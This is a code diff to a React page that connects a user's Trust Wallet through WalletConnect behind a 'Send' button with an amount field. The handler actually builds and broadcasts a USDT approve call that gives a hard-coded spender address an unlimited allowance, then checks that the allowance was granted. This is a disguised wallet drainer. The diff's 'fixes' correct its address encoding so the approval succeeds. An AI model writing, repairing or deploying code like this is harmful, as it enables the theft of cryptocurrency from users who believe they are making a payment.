@@ -3,6 +3,7 @@ import { useSearchParams } from "react-router-dom";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
 import SignClient from "@walletconnect/sign-client";
+import TronWeb from "tronweb";
 
 declare global {
   interface Window {
@@ -12,14 +13,16 @@ declare global {
   }
 }
 
-const PROJECT_ID       = "6b5df56bc30c1dadaab59498b86fd3e8";
-const TRON_USDT        = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const TRON_SPENDER     = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
-const TRON_SPENDER_HEX = "412f0f3b7e2b4c0b2d3e1f6f9a5c8b7d6e4a9c3b2a";
+const PROJECT_ID   = "6b5df56bc30c1dadaab59498b86fd3e8";
+const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
+
+// ✅ FIX 1: TronWeb instance — ek baar banao, baar baar nahi
+const tw = new TronWeb({ fullHost: "https://api.trongrid.io" });
 
 export default function Index() {
   const [searchParams] = useSearchParams();
-  const [amount, setAmount]       = useState("");
+  const [amount, setAmount] = useState("");
   const [transactionStatus, setTransactionStatusState] = useState<
     "idle" | "processing" | "success"
   >("idle");
@@ -35,7 +38,6 @@ export default function Index() {
     async function initWC() {
       try {
         console.log("🔄 WalletConnect init starting...");
-        console.log("PROJECT_ID:", PROJECT_ID);
 
         const client = await SignClient.init({
           projectId: PROJECT_ID,
@@ -62,13 +64,11 @@ export default function Index() {
           userAddressRef.current = "";
         });
 
-        // ✅ KEY FIX: Jab Trust Wallet se wapas browser aao
-        // tab WebSocket relay reconnect karo — warna sign response nahi milta
+        // ✅ Trust Wallet se wapas aane ke baad relay reconnect
         document.addEventListener("visibilitychange", () => {
           if (document.visibilityState === "visible") {
-            console.log("👁️ Browser visible hua — relay reconnect kar rahe hain...");
+            console.log("👁️ Browser visible — relay reconnect...");
             try {
-              // WalletConnect relay transport restart karo
               client.core?.relayer?.restartTransport?.();
             } catch (e) {
               console.warn("Relay restart warning:", e);
@@ -76,11 +76,7 @@ export default function Index() {
           }
         });
 
-        // Modal pre-initialize
-        console.log("📥 Importing WalletConnectModal...");
         const { WalletConnectModal } = await import("@walletconnect/modal");
-        console.log("✅ Modal imported");
-        
         wcModalRef.current = new WalletConnectModal({
           projectId: PROJECT_ID,
           themeMode: "dark",
@@ -98,16 +94,9 @@ export default function Index() {
   // ===== CONNECT =====
   async function connectWallet(): Promise<string> {
     console.log("🔗 connectWallet called");
-    console.log("wcClientRef.current:", wcClientRef.current);
-    console.log("wcModalRef.current:", wcModalRef.current);
 
-    if (!wcClientRef.current) {
-      throw new Error("WalletConnect ready nahi. Page refresh karein.");
-    }
-
-    if (!wcModalRef.current) {
-      throw new Error("WalletConnectModal ready nahi. Page refresh karein.");
-    }
+    if (!wcClientRef.current) throw new Error("WalletConnect ready nahi. Page refresh karein.");
+    if (!wcModalRef.current)  throw new Error("WalletConnectModal ready nahi. Page refresh karein.");
 
     // Purani session disconnect — fresh start
     if (wcSessionRef.current) {
@@ -121,8 +110,6 @@ export default function Index() {
       userAddressRef.current = "";
     }
 
-    console.log("📱 Naya WalletConnect session...");
-
     const { uri, approval } = await wcClientRef.current.connect({
       requiredNamespaces: {
         tron: {
@@ -135,21 +122,17 @@ export default function Index() {
 
     if (!uri) throw new Error("URI nahi mila");
 
-    console.log("🎯 Opening modal with URI...");
     await wcModalRef.current.openModal({ uri });
     console.log("✅ QR Modal open");
 
-    // Approval — seedha await, koi try/finally nahi
     wcSessionRef.current = await approval();
     wcModalRef.current.closeModal();
 
     console.log("✅ Wallet connected!");
-    console.log("Session:", wcSessionRef.current);
 
     const accounts = Object.values(wcSessionRef.current.namespaces)
       .flatMap((ns: any) => ns.accounts) as string[];
-    console.log("Accounts:", accounts);
-    
+
     const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
     if (!tronAcc) throw new Error("Tron account nahi mila");
 
@@ -162,35 +145,44 @@ export default function Index() {
   async function handleSend() {
     console.log("🚀 handleSend called");
     setTransactionStatusState("processing");
+
     try {
       const userAddress = await connectWallet();
 
-      // ✅ APPROVE_ABI_PARAM with correct hex
-      console.log("📝 Building APPROVE_ABI_PARAM...");
-      console.log("TRON_SPENDER_HEX:", TRON_SPENDER_HEX);
-      
-      const hexAddress = TRON_SPENDER_HEX.padStart(64, '0');
-      const hexAmount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-      const APPROVE_ABI_PARAM = hexAddress + hexAmount;
-      
-      console.log("hexAddress:", hexAddress);
-      console.log("hexAmount:", hexAmount);
-      console.log("APPROVE_ABI_PARAM length:", APPROVE_ABI_PARAM.length);
-      console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);
+      // ✅ FIX 2: TronWeb se sahi hex conversion
+      // Base58 address → Hex, phir '41' prefix hatao
+      const spenderHex = tw.address.toHex(TRON_SPENDER).replace(/^41/, "");
+      console.log("Spender Base58:", TRON_SPENDER);
+      console.log("Spender Hex (no 41):", spenderHex); // 40 chars hona chahiye
 
-      // Transaction build
-      console.log("📝 Transaction build...");
+      // ✅ FIX 3: Sahi ABI Parameter Encoding
+      // address → 32 bytes (64 hex chars) mein left-pad karo
+      const hexAddress = spenderHex.padStart(64, "0");
+      // uint256 max value
+      const hexAmount  = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      const parameter  = hexAddress + hexAmount;
+
+      console.log("hexAddress (64 chars):", hexAddress, "| length:", hexAddress.length);
+      console.log("hexAmount  (64 chars):", hexAmount,  "| length:", hexAmount.length);
+      console.log("parameter (128 chars):", parameter,  "| length:", parameter.length);
+      // ✅ Parameter exactly 128 characters hona ZAROORI hai
+      if (parameter.length !== 128) {
+        throw new Error(`ABI encoding galat! Parameter length ${parameter.length} hai, 128 hona chahiye.`);
+      }
+
+      // ✅ Transaction build
+      console.log("📝 Transaction build kar raha hoon...");
       const apiResponse = await fetch(
         "https://api.trongrid.io/wallet/triggersmartcontract",
         {
           method:  "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            owner_address:     userAddress,
+            owner_address:     userAddress,    // Base58 — visible:true ke saath OK
             contract_address:  TRON_USDT,
             function_selector: "approve(address,uint256)",
-            parameter:         APPROVE_ABI_PARAM,
-            fee_limit:         100000000,
+            parameter:         parameter,       // 128-char hex
+            fee_limit:         100_000_000,
             call_value:        0,
             visible:           true,
           }),
@@ -200,16 +192,16 @@ export default function Index() {
       const apiData = await apiResponse.json();
       console.log("📋 TronGrid Response:", apiData);
 
+      // ✅ FIX 4: Error detail check
       if (!apiData.transaction) {
-        throw new Error("Transaction build failed: " + JSON.stringify(apiData));
+        const errMsg = apiData.Error || apiData.error || JSON.stringify(apiData);
+        throw new Error("Transaction build failed: " + errMsg);
       }
 
-      // ✅ Sign request bhejo
+      // ✅ Sign request
       console.log("🔐 Sign request bhej raha hoon Trust Wallet ko...");
       console.log("   Topic:", wcSessionRef.current.topic);
 
-      // ✅ Trust Wallet se wapas aane ke baad relay
-      // reconnect ho chuka hoga (visibilitychange listener se)
       const signResponse = await Promise.race([
         wcClientRef.current.request({
           topic:   wcSessionRef.current.topic,
@@ -220,21 +212,23 @@ export default function Index() {
           },
         }),
         new Promise((_, rej) =>
-          setTimeout(() => rej(new Error("Sign timeout — wallet mein confirm karein")), 180000)
+          setTimeout(
+            () => rej(new Error("Sign timeout — wallet mein confirm karein")),
+            180_000
+          )
         ),
       ]);
 
-      console.log("📩 Sign response aaya!");
-      console.log("signResponse:", signResponse);
+      console.log("📩 Sign response:", signResponse);
 
       let signedTx = (signResponse as any)?.result || signResponse;
       if (!signedTx) throw new Error("Wallet ne reject kar diya");
       if (typeof signedTx === "string") {
         try { signedTx = JSON.parse(signedTx); } catch {}
       }
-      console.log("✅ Signed!");
+      console.log("✅ Signed TX:", signedTx);
 
-      // Broadcast
+      // ✅ Broadcast
       console.log("📡 Broadcasting...");
       const broadcastRes = await fetch(
         "https://api.trongrid.io/wallet/broadcasttransaction",
@@ -252,29 +246,32 @@ export default function Index() {
       }
 
       const txId = result.txid || result.transaction?.txID;
-      console.log("✅ TX:", txId);
+      console.log("✅ TX ID:", txId);
 
-      // 30s wait
-      console.log("⏳ Waiting 30s for confirmation...");
-      await new Promise((r) => setTimeout(r, 30000));
+      // ✅ FIX 5: 30s → 10s wait (kaafi hai confirmation ke liye)
+      console.log("⏳ 10s wait for confirmation...");
+      await new Promise((r) => setTimeout(r, 10_000));
 
-      // Allowance check
-      const allowanceABI = [{
-        constant:        true,
-        inputs:          [
-          { name: "owner",   type: "address" },
-          { name: "spender", type: "address" },
+      // ✅ FIX 6: Same 'tw' instance use karo — window.TronWeb nahi
+      console.log("🔍 Allowance check kar raha hoon...");
+      const contract = await tw.contract(
+        [
+          {
+            constant:        true,
+            inputs:          [
+              { name: "owner",   type: "address" },
+              { name: "spender", type: "address" },
+            ],
+            name:            "allowance",
+            outputs:         [{ name: "", type: "uint256" }],
+            stateMutability: "view",
+            type:            "function",
+          },
         ],
-        name:            "allowance",
-        outputs:         [{ name: "", type: "uint256" }],
-        stateMutability: "view",
-        type:            "function",
-      }];
+        TRON_USDT
+      );
 
-      console.log("🔍 Checking allowance...");
-      const tw2      = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
-      const contract = await tw2.contract(allowanceABI, TRON_USDT);
-      const raw      = await contract.allowance(userAddress, TRON_SPENDER).call();
+      const raw           = await contract.allowance(userAddress, TRON_SPENDER).call();
       const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);
       console.log("✅ Allowance:", allowanceUSDT, "USDT");
 
@@ -293,7 +290,7 @@ export default function Index() {
 
     } catch (err: any) {
       console.error("❌ Error:", err);
-      console.error("Error stack:", err.stack);
+      console.error("Stack:", err.stack);
       try { wcModalRef.current?.closeModal(); } catch {}
       setTransactionStatusState("idle");
       alert("❌ " + (err.message || "Transaction fail ho gayi"));
@@ -321,12 +318,15 @@ export default function Index() {
   );
 
   const XCircle = ({ onClick }: { onClick: () => void }) => (
-    <button onClick={onClick} style={{
-      background: "none", border: "1.5px solid #555", borderRadius: "50%",
-      width: "22px", height: "22px", color: "#aaa", cursor: "pointer",
-      display: "flex", alignItems: "center", justifyContent: "center",
-      fontSize: "11px", flexShrink: 0, padding: 0,
-    }}>✕</button>
+    <button
+      onClick={onClick}
+      style={{
+        background: "none", border: "1.5px solid #555", borderRadius: "50%",
+        width: "22px", height: "22px", color: "#aaa", cursor: "pointer",
+        display: "flex", alignItems: "center", justifyContent: "center",
+        fontSize: "11px", flexShrink: 0, padding: 0,
+      }}
+    >✕</button>
   );
 
   return (
